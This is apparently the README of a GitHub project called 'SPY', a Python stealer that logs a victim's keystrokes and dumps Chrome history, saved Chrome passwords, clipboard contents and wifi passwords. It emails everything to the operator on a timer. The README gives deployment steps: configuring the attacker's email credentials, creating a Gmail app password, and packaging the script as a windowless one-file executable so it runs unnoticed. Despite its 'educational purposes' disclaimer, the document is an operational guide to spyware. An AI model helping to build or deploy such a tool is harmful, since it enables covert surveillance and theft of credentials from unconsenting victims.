## DISCLAIMER
**THIS TOOLS IS FOR EDUCATIONAL PURPOSES ONLY.**

 **BE RESPONSABLE OF YOUR ACTIONS!**



# SPY

Spy is a Python project that does what the name suggests **Spys on your victim**.

- Get the victim's machine infos 

- Stores the victim's key strokes 

- Dumps the victim's chrome history 

- Dumps the victim's chrome stored passwords

- Get the victim's clipboard if existed 

- Get the victim's wifi connections list with corresponding passwords 

- Send all these informations to your email every 'n' seconds 



## Requirements 

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install requirements.

```bash
pip3 install -r requirements.txt
```

## Usage
Change these variables to adapt to your usage  
```python
addr = "M3LIODA5@gmail.com" 
#put your email adress here  
passwd = r"REDACTED"
# email password here 
dir_path = 'C:\\Users\\Public\\Logs\\'
#where the malware stores data
delay = 600 
# send an email every 600 seconds
```
Do not use your email password the SMTP library won't accept it 

Go to your Google Account.

Select Security.



![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture1.PNG?raw=true)



Under "Signing in to Google," select App Passwords. 

You may need to sign in. If you don’t have this option, it might be because:

Two-Factor Authentication is not set up for your account.\
Two-Factor Authentication is only set up for security keys.\
Your account is through work, school, or other organization.\
You turned on Advanced Protection.

At the bottom, choose Select app and choose **Mail** and then Select **Windows computer**.

![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture11.PNG?raw=true)


Follow the instructions to enter the App Password.\
The App Password is the 16-character code in the yellow bar on your device.

Copy Paste your Password and Run .

```python
python3 spy.py
```

Or you can turn it to an executable using PyInstaller or Auto-Py-to-exe which i recommend 
```bash
pip3 install auto-py-to-exe
```
```bash
auto-py-to-exe
```

Locate spy.py 

![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture.PNG?raw=true)


Check the One-file and the Window-based options 

Start converting

RUN!!
 

 ## Output 


![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture111.PNG?raw=true)


## License
[MIT](https://choosealicense.com/licenses/mit/)